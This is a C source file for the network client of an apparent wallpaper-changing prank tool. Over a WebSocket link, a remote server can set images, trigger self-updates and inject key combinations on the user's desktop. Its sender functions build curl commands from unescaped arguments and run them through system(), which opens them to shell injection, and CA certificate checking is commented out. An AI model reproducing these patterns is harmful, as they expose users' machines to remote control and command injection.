#include "client/network.h"
#include "client/utils.h"
#include "client/wallpaper.h"
#include "client/updater.h"
#include "client/keyboard.h"
#include "mongoose.h"
#include "cJSON.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define WS_URL_REMOTE "wss://wallchange.codeky.fr"
#define WS_URL_LOCAL "ws://localhost:8000"

static int local_mode = 0;
static struct mg_mgr mgr;
static struct mg_connection *ws_conn = NULL;
static time_t last_connect_try = 0;

// Retourne l'URL du serveur en fonction du mode
static const char* get_ws_url() {
    return local_mode ? WS_URL_LOCAL : WS_URL_REMOTE;
}

void set_local_mode(int enabled) {
    local_mode = enabled;
    if (enabled) {
        printf("Mode local activé (localhost:8000)\n");
    }
}

// Traitement du message reçu
static void handle_message(const char *msg, size_t len) {
    printf("Message reçu: %.*s\n", (int)len, msg);

    cJSON *json = cJSON_ParseWithLength(msg, len);
    if (json == NULL) {
        printf("Erreur: JSON invalide.\n");
        return;
    }

    // Vérification de la commande de mise à jour
    cJSON *command_item = cJSON_GetObjectItemCaseSensitive(json, "command");
    if (cJSON_IsString(command_item) && (command_item->valuestring != NULL)) {
        if (strcmp(command_item->valuestring, "update") == 0) {
            printf("Commande de mise à jour reçue.\n");
            cJSON_Delete(json);
            perform_update();
            return;
        }
        if (strcmp(command_item->valuestring, "showdesktop") == 0) {
            printf("Commande showdesktop reçue (Super+D).\n");
            simulate_show_desktop();
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "key") == 0) {
            cJSON *combo_item = cJSON_GetObjectItemCaseSensitive(json, "combo");
            if (cJSON_IsString(combo_item) && combo_item->valuestring != NULL) {
                printf("Commande key reçue: %s\n", combo_item->valuestring);
                simulate_key_combo(combo_item->valuestring);
            }
            cJSON_Delete(json);
            return;
        }
    }

    cJSON *url_item = cJSON_GetObjectItemCaseSensitive(json, "url");
    if (cJSON_IsString(url_item) && (url_item->valuestring != NULL)) {
        char *url = url_item->valuestring;
        printf("URL trouvée: %s\n", url);

        char *username = get_username();
        char filepath[512];
        time_t t = time(NULL);
        snprintf(filepath, sizeof(filepath), "/home/%s/Pictures/wallpaper_%ld.jpg", username, t);
        
        if (download_image(url, filepath)) {
            printf("Image téléchargée avec succès.\n");
            set_wallpaper(filepath);
        } else {
            printf("Erreur lors du téléchargement.\n");
        }
        free(username);
    }

    cJSON_Delete(json);
}

// Callback Mongoose
static void fn(struct mg_connection *c, int ev, void *ev_data) {
    if (ev == MG_EV_OPEN) {
        // Connexion TCP ouverte
    } else if (ev == MG_EV_CONNECT) {
        if (c->is_tls) {
            struct mg_tls_opts opts = {
                // .ca = mg_str("/etc/ssl/certs/ca-certificates.crt"),
                .name = mg_str("wallchange.codeky.fr")
            };
            mg_tls_init(c, &opts);
        }
    } else if (ev == MG_EV_WS_OPEN) {
        printf("Connexion WebSocket établie !\n");
        ws_conn = c;
    } else if (ev == MG_EV_WS_MSG) {
        struct mg_ws_message *wm = (struct mg_ws_message *) ev_data;
        handle_message(wm->data.buf, wm->data.len);
    } else if (ev == MG_EV_CLOSE) {
        if (ws_conn == c) {
            printf("Connexion WebSocket fermée.\n");
            ws_conn = NULL;
        }
    } else if (ev == MG_EV_ERROR) {
        printf("Erreur Mongoose: %s\n", (char *)ev_data);
    }
}

void connect_ws() {
    char *username = get_username();
    char url[512];
    const char *ws_url = get_ws_url();
    // Construction de l'URL avec l'ID dans le chemin: ws://localhost:8000/zakburak
    snprintf(url, sizeof(url), "%s/%s", ws_url, username);
    free(username);

    printf("Tentative de connexion à %s...\n", url);
    mg_ws_connect(&mgr, url, fn, NULL, NULL);
    last_connect_try = time(NULL);  // Mettre à jour le timestamp
}

void init_network() {
    mg_mgr_init(&mgr);
}

void cleanup_network() {
    mg_mgr_free(&mgr);
}

void network_poll(int timeout_ms) {
    mg_mgr_poll(&mgr, timeout_ms);

    // Reconnexion automatique
    if (ws_conn == NULL) {
        time_t now = time(NULL);
        if (now - last_connect_try > 5) {
            connect_ws();
            last_connect_try = now;
        }
    }
}

// Helper pour construire l'URL HTTP à partir de l'URL WS
static void build_http_url(char *http_url, size_t size) {
    const char *ws_url = get_ws_url();
    if (strncmp(ws_url, "ws://", 5) == 0) {
        snprintf(http_url, size, "http%s", ws_url + 2);
    } else if (strncmp(ws_url, "wss://", 6) == 0) {
        snprintf(http_url, size, "https%s", ws_url + 3);
    } else {
        strncpy(http_url, ws_url, size);
    }
}

int send_command(const char *arg1, const char *arg2) {
    const char *target_user = NULL;
    const char *image_source = NULL;
    int is_url = 0;

    // Détection intelligente des arguments
    if (strncmp(arg1, "http://", 7) == 0 || strncmp(arg1, "https://", 8) == 0) {
        image_source = arg1;
        target_user = arg2;
        is_url = 1;
    } else if (strncmp(arg2, "http://", 7) == 0 || strncmp(arg2, "https://", 8) == 0) {
        image_source = arg2;
        target_user = arg1;
        is_url = 1;
    } else if (access(arg1, F_OK) == 0) {
        image_source = arg1;
        target_user = arg2;
        is_url = 0;
    } else if (access(arg2, F_OK) == 0) {
        image_source = arg2;
        target_user = arg1;
        is_url = 0;
    } else {
        // Aucun fichier existant trouvé.
        // On essaie de deviner si l'un des args ressemble à un chemin
        if (strchr(arg1, '/') != NULL) {
             image_source = arg1;
             target_user = arg2;
        } else if (strchr(arg2, '/') != NULL) {
             image_source = arg2;
             target_user = arg1;
        } else {
             // Par défaut, on suppose que arg1 est l'image
             image_source = arg1;
             target_user = arg2;
        }
    }

    if (!is_url && access(image_source, F_OK) != 0) {
        printf("Erreur: Le fichier '%s' est introuvable.\n", image_source);
        return 1;
    }

    // Construction de l'URL HTTP du serveur
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char command[2048];
    if (is_url) {
        printf("Envoi de l'URL %s à %s...\n", image_source, target_user);
        snprintf(command, sizeof(command), 
                 "curl -s \"%s/api/send?id=%s&url=%s\"", 
                 http_url, target_user, image_source);
    } else {
        printf("Upload du fichier %s pour %s...\n", image_source, target_user);
        snprintf(command, sizeof(command), 
                 "curl -F \"file=@%s\" \"%s/api/upload?id=%s\"", 
                 image_source, http_url, target_user);
    }
             
    int ret = system(command);
    if (ret == 0) {
        printf("\nCommande envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi.\n");
        return 1;
    }
}

int send_update_command(const char *target_user) {
    // Construction de l'URL HTTP du serveur
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char command[2048];
    printf("Envoi de la commande de mise à jour à %s...\n", target_user);
    snprintf(command, sizeof(command), 
             "curl -s \"%s/api/update?id=%s\"", 
             http_url, target_user);
             
    int ret = system(command);
    if (ret == 0) {
        printf("\nCommande de mise à jour envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande de mise à jour.\n");
        return 1;
    }
}

int send_list_command() {
    // Construction de l'URL HTTP du serveur
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char command[2048];
    printf("Récupération de la liste des clients connectés...\n");
    snprintf(command, sizeof(command), "curl -s \"%s/api/list\"", http_url);
             
    int ret = system(command);
    printf("\n");
    return (ret == 0) ? 0 : 1;
}

int send_showdesktop_command(const char *target_user) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char command[2048];
    printf("Envoi de la commande showdesktop (Super+D) à %s...\n", target_user);
    snprintf(command, sizeof(command), 
             "curl -s \"%s/api/showdesktop?id=%s\"", 
             http_url, target_user);
             
    int ret = system(command);
    if (ret == 0) {
        printf("\nCommande showdesktop envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande showdesktop.\n");
        return 1;
    }
}

int send_key_command(const char *target_user, const char *combo) {
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char command[2048];
    printf("Envoi du raccourci '%s' à %s...\n", combo, target_user);
    snprintf(command, sizeof(command), 
             "curl -s \"%s/api/key?id=%s&combo=%s\"", 
             http_url, target_user, combo);
             
    int ret = system(command);
    if (ret == 0) {
        printf("\nCommande key envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande key.\n");
        return 1;
    }
}
